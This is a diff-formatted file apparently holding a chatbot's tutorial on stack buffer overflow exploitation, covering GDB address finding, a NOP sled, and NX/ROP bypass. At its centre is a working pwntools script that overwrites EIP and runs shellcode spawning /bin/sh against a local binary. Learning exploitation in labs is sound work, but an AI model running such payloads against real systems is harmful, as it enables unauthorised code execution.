@@ -1,0 +1,48 @@
+yes
+To run custom shellcode, you must find where the Stack lives in memory and ensure it is Executable. On modern systems, you'll often need to bypass ASLR (Address Space Layout Randomization) and NX (No-Execute) bits.
+1. Find the Stack Address with GDB
+To know where to point the CPU, you need the address of your input on the stack.
+Open GDB: gdb -q ./binary
+Break at the start: b main
+Run: run
+Find the Stack Pointer: Type info registers esp (32-bit) or rsp (64-bit).
+Result: You’ll see an address like 0xffffd510.
+Examine Memory: Type x/20x $esp to see your "AAAA" strings sitting in that memory range.
+2. The "NOP Sled" Technique
+Since stack addresses can shift slightly, we use a NOP Sled (\x90). This tells the CPU: "If you land anywhere here, just keep sliding down until you hit my code."
+The Payload Structure:
+[ JUNK ] + [ EIP/NEW ADDRESS ] + [ NOP SLED ] + [ SHELLCODE ]
+3. The Automation Script (Pwntools)
+This script finds the stack, builds the payload, and executes a /bin/sh shell.
+python
+from pwn import *
+
+# 1. Setup
+context.binary = './binary'
+p = process('./binary')
+
+# 2. Find the address (In a real exploit, you'd leak this address)
+# For this example, let's assume GDB showed us 0xffffd510
+stack_address = 0xffffd510 
+
+# 3. Create Shellcode (This one spawns a Linux Shell)
+# Pwntools can generate this automatically for you!
+shellcode = asm(shellcraft.sh())
+
+# 4. Build Payload
+# Offset = distance to EIP found in previous step (e.g., 76)
+padding = b"A" * 76
+eip_overwrite = p32(stack_address + 100) # Point to middle of NOP sled
+nop_sled = b"\x90" * 100
+
+payload = padding + eip_overwrite + nop_sled + shellcode
+
+# 5. Execute
+p.sendline(payload)
+p.interactive()
+Use code with caution.
+
+4. Bypassing NX (The "Gotcha")
+If you get a "Segmentation Fault" even with the right address, the stack is likely Non-Executable (NX).
+Check with: checksec ./binary (provided by Pwntools).
+The Fix: If NX is enabled, you cannot run shellcode on the stack. You must use ROP (Return Oriented Programming) to chain together existing pieces of code already in the binary (called "gadgets").
